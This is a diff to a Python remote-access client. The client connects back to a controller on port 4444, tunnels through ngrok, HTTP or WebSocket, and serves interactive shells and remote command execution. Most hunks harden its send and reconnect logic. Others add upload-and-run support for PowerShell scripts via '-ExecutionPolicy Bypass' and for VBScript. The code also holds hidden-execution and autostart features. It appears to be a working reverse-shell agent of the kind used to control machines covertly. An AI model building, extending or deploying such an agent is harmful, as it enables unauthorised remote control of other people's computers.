@@ -51,7 +51,7 @@ http = 'http'
 https = 'https'
 connection_type = auto         # <- auto / https / http / tcp
 
-DEFAULT_IP = 'https://omarchy.taile8340b.ts.net'
+DEFAULT_IP = '192.168.0.113'
 DEFAULT_PORT = 4444
 RETRY_DELAY = 1               # seconds between reconnect attempts
 CONNECT_TIMEOUT = 3           # seconds a TCP connect may take before we retry
@@ -64,7 +64,6 @@ MAX_CAPTURE_BYTES = 256 * 1024 * 1024  # only a screenshot helper's output
 CONNECTION_TYPE = str(os.environ.get('TUNNEL_TYPE') or connection_type).strip().lower()
 VALID_CONNECTION_TYPES = ('auto', 'tcp', 'http', 'https')
 HTTP_HANDSHAKE_TIMEOUT = 10    # seconds for HTTP headers / TLS handshake
-HTTP_SEND_STALL_TIMEOUT = 30   # tolerate a slow-but-moving mobile link
 HTTP_MAX_HEADER = 32 * 1024    # reject an endless response header
 HTTP_MAX_LINE = 4096           # one chunk-size/trailer line
 HTTP_MAX_CHUNK = MAX_MSG       # one HTTP chunk cannot claim unlimited memory
@@ -533,16 +532,18 @@ def _send_chunked(conn, payload, stall_timeout=None, deadline=None):
     """sendall() in bounded chunks, but judge a peer by *progress*.
 
     A single sendall() of a 50 MB file could park a thread until TCP gives up
-    on a lost FIN. A short SO_SNDTIMEO alone was too harsh in the other
-    direction: a slow 2G/mobile link that keeps reading was disconnected just
-    because one window took a couple of seconds. Here each send timeout only
-    counts as "no progress"; a peer that is draining bytes (even slowly) keeps
-    going, while one that accepts nothing for SCREEN_SEND_TIMEOUT is dropped.
+    on a lost FIN.
+
+    A send timeout is deliberately fatal here.  A blocking send can time out
+    after the kernel has accepted part of the buffer, and neither plain
+    sockets nor TLS expose that byte count reliably.  Retrying the same view
+    would duplicate bytes in a length-prefixed or HTTP-chunked stream, so the
+    caller must retire the connection and reconnect instead.  A send that
+    returns zero without an exception is retried until stall_timeout because
+    no bytes can have been written in that case.
 
     Shell output passes a larger stall timeout because a terminal may print a
-    huge burst while a tunnel is briefly busy; one 2-second kernel timeout is
-    never a reason to tear down an interactive session.
-    """
+    huge burst while a tunnel is briefly busy."""
     stall_timeout = SCREEN_SEND_TIMEOUT if stall_timeout is None else stall_timeout
     view = memoryview(payload)
     last_progress = time.time()
@@ -551,8 +552,10 @@ def _send_chunked(conn, payload, stall_timeout=None, deadline=None):
             raise OSError('send timed out: transfer made too little progress')
         try:
             sent = conn.send(view[:SEND_CHUNK])
-        except (socket.timeout, TimeoutError, BlockingIOError):
-            sent = 0
+        except (socket.timeout, TimeoutError, BlockingIOError) as exc:
+            raise OSError(
+                'send timed out with part of a message outstanding; '
+                'reconnecting to avoid duplicate bytes') from exc
         if sent:
             view = view[sent:]
             last_progress = time.time()
@@ -3140,8 +3143,11 @@ def _shell_unix(sock, rows, cols):
             # the PTY slave open, the shell can exit without producing any
             # further output, so select() would never wake and waitpid() would
             # never see the zombie. A short poll notices the exit promptly.
-            readable, _, _ = select.select([sock, master_fd], [], [],
-                                           0.05 if shell_gone else 0.2)
+            if _socket_pending(sock) > 0:
+                readable = [sock]
+            else:
+                readable, _, _ = select.select([sock, master_fd], [], [],
+                                               0.05 if shell_gone else 0.2)
             if shell_gone and (not readable
                                or time.time() - shell_gone_at > 0.25):
                 break
@@ -3724,7 +3730,10 @@ def _shell_windows_conpty(sock, rows, cols):
             except Exception:
                 pass
             try:
-                readable, _, _ = select.select([sock], [], [], 0.2)
+                if _socket_pending(sock) > 0:
+                    readable = [sock]
+                else:
+                    readable, _, _ = select.select([sock], [], [], 0.2)
             except (OSError, ValueError):
                 break
             if not readable:
@@ -3864,7 +3873,10 @@ def _shell_windows(sock, rows, cols):
     try:
         while not stop.is_set() and not writer.failed.is_set():
             try:
-                readable, _, _ = select.select([sock], [], [], 0.2)
+                if _socket_pending(sock) > 0:
+                    readable = [sock]
+                else:
+                    readable, _, _ = select.select([sock], [], [], 0.2)
             except (OSError, ValueError):
                 break
             if not readable:
@@ -4264,7 +4276,7 @@ def _kill_process(proc):
         try:
             result = subprocess.run(['taskkill', '/F', '/T', '/PID', str(proc.pid)],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                                    timeout=10, creationflags=CREATE_NO_WINDOW)
+                                    timeout=3, creationflags=CREATE_NO_WINDOW)
             if result.returncode == 0:
                 return              # taskkill really stopped the tree
         except Exception:
@@ -4458,7 +4470,13 @@ def run_command(conn, command, current_dir, req_id=None):
             watch, timeout = [conn, proc.stdout], 0.2
         else:
             watch, timeout = [conn], 0.2
-        readable, _, _ = select.select(watch, [], [], timeout)
+        # select() only sees the kernel socket.  An SSLSocket may already have
+        # decrypted a cancel message in its private buffer, so include it as
+        # readable without waiting for more network traffic.
+        if _socket_pending(conn) > 0:
+            readable = [conn]
+        else:
+            readable, _, _ = select.select(watch, [], [], timeout)
 
         if conn in readable:
             msg = recv_msg(conn)
@@ -4563,7 +4581,7 @@ def run_command(conn, command, current_dir, req_id=None):
 
 _UPEX_APP_TYPES = {
     'py', 'c', 'cpp', 'cs', 'js', 'ts', 'swift', 'sh', 'bat',
-    'exe', 'elf', 'macho', 'bin',
+    'ps1', 'vbs', 'exe', 'elf', 'macho', 'bin',
 }
 _UPEX_AUTO_TYPES = {'py', 'cs', 'js', 'sh'}
 _UPEX_EXTENSIONS = {
@@ -4576,6 +4594,8 @@ _UPEX_EXTENSIONS = {
     '.swift': 'swift',
     '.sh': 'sh', '.bash': 'sh',
     '.bat': 'bat', '.cmd': 'bat',
+    '.ps1': 'ps1',
+    '.vbs': 'vbs',
     '.exe': 'exe',
     '.elf': 'elf',
     '.macho': 'macho',
@@ -4789,6 +4809,21 @@ def _upex_app_plan(app, app_type, hidden):
             return None, '.bat files run on Windows only'
         return {'attempts': [
             _upex_attempt('cmd', '.\\' + app)]}, ''
+    if app_type == 'ps1':
+        if not windows:
+            return None, '.ps1 files run on Windows only'
+        # Set-ExecutionPolicy is scoped to this PowerShell process, so it
+        # must run in the same invocation as the uploaded script.  Upex names
+        # are single basenames without spaces; this matches the literal command
+        # form in New-Feature-Add.txt and avoids cmd.exe quoting hazards.
+        command = (f'powershell -ExecutionPolicy Bypass -File {app}')
+        return {'attempts': [
+            _upex_attempt('powershell', command)]}, ''
+    if app_type == 'vbs':
+        if not windows:
+            return None, '.vbs files run on Windows only'
+        return {'attempts': [
+            _upex_attempt('cscript',  f'cscript.exe .\\{app}')]}, ''
     if app_type == 'exe':
         if not windows:
             return None, '.exe files run on Windows only'
@@ -5597,8 +5632,7 @@ def remove_autostart():
 def _looks_like_tunnel_host(host):
     """Hosts whose bare name normally means a public HTTPS tunnel."""
     value = (host or '').strip().lower().rstrip('.')
-    return any(value == suffix or value.endswith('.' + suffix) or
-               value.endswith(suffix)
+    return any(value == suffix or value.endswith('.' + suffix)
                for suffix in (
                    'ngrok-free.app', 'ngrok-free.dev', 'ngrok.app',
                    'ngrok.io', 'ngrok.dev',
@@ -6034,22 +6068,18 @@ class HttpTunnel(object):
 
     def _raw_send(self, data):
         view = memoryview(data)
-        last_progress = time.time()
         while view:
             try:
                 sent = self.raw.send(view)
-            except (socket.timeout, TimeoutError):
-                # SO_SNDTIMEO bounds one kernel wait.  Treat several waits as
-                # one slow transfer instead of dropping a mobile link that is
-                # still draining, but still fail when there is no progress.
-                if time.time() - last_progress > HTTP_SEND_STALL_TIMEOUT:
-                    raise OSError('HTTP tunnel send stalled')
-                time.sleep(0.02)
-                continue
+            except (socket.timeout, TimeoutError) as exc:
+                # A blocked write may have accepted part of this frame.  The
+                # byte count is unrecoverable on TLS, so retrying would
+                # duplicate framing bytes; let the caller close the tunnel.
+                raise OSError(
+                    'HTTP tunnel send timed out; reconnecting') from exc
             if sent <= 0:
                 raise OSError('HTTP tunnel closed while sending')
             view = view[sent:]
-            last_progress = time.time()
 
     def _send_heartbeat(self):
         with self._send_lock:
@@ -6319,19 +6349,17 @@ class WebSocketTunnel(object):
 
     def _raw_send(self, data):
         view = memoryview(data)
-        last_progress = time.time()
         while view:
             try:
                 sent = self.raw.send(view)
-            except (socket.timeout, TimeoutError):
-                if time.time() - last_progress > HTTP_SEND_STALL_TIMEOUT:
-                    raise OSError('WebSocket send stalled')
-                time.sleep(0.02)
-                continue
+            except (socket.timeout, TimeoutError) as exc:
+                # A timed-out frame write cannot be safely retried: some of
+                # the frame may already be on the wire.  Close and reconnect.
+                raise OSError(
+                    'WebSocket send timed out; reconnecting') from exc
             if sent <= 0:
                 raise OSError('WebSocket closed while sending')
             view = view[sent:]
-            last_progress = time.time()
 
     def _send_control(self, opcode, payload=b''):
         with self._send_lock:
@@ -6762,6 +6790,15 @@ class HalfTunnelClient(object):
             self.up_q.put_nowait(None)
         except queue.Full:
             pass
+        # shutdown(), not just close(): _down_loop may be blocked in a
+        # read_exact() on this socket.  close() alone can leave that read
+        # holding the descriptor until its 20 s receive timeout, so a shell
+        # exit would not reach the controller promptly and the next command
+        # could be consumed by the dying shell bridge.
+        try:
+            self.down_sock.shutdown(socket.SHUT_RDWR)
+        except OSError:
+            pass
         try:
             self.down_sock.close()
         except OSError:
@@ -7115,9 +7152,14 @@ class PollTunnelClient(object):
         if not self._close_notified:
             self._close_notified = True
             # Tell the controller immediately instead of leaving its reader
-            # (and its session slot) waiting for the 45s GC timeout.
-            threading.Thread(target=self._notify_close,
-                             name='poll-close', daemon=True).start()
+            # (and its session slot) waiting for the 45s GC timeout.  This is
+            # deliberately synchronous: close() is normally the last thing a
+            # client does before process exit, and a daemon notification
+            # thread would be killed before its request left the machine.
+            try:
+                self._notify_close()
+            except Exception:
+                pass
         try:
             self.up_q.put_nowait(None)
         except queue.Full:
@@ -7379,6 +7421,12 @@ def _host_is_private(host):
         address = ipaddress.ip_address(value)
     except ValueError:
         return False
+    # RFC 6598 shared address space is used by Tailscale (100.64.0.0/10).
+    # ipaddress considers it neither private nor global, so a Tailscale URL
+    # with the controller's self-signed certificate would otherwise fail TLS
+    # verification even though the address is on the local overlay network.
+    if address.version == 4 and address in ipaddress.ip_network('100.64.0.0/10'):
+        return True
     return bool(address.is_private or address.is_loopback
                 or address.is_link_local or address.is_unspecified)
 
@@ -7532,7 +7580,7 @@ def _open_controller_connection(host, port, scheme='auto', role='control',
                 try:
                     _tune_socket(sock)
                     sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
-                    sock = _wrap_client_tls(sock, host, allow_self_signed=True)
+                    sock = _wrap_client_tls(sock, host)
                     return _raw_handshake(sock, role, token)
                 except Exception:
                     try:
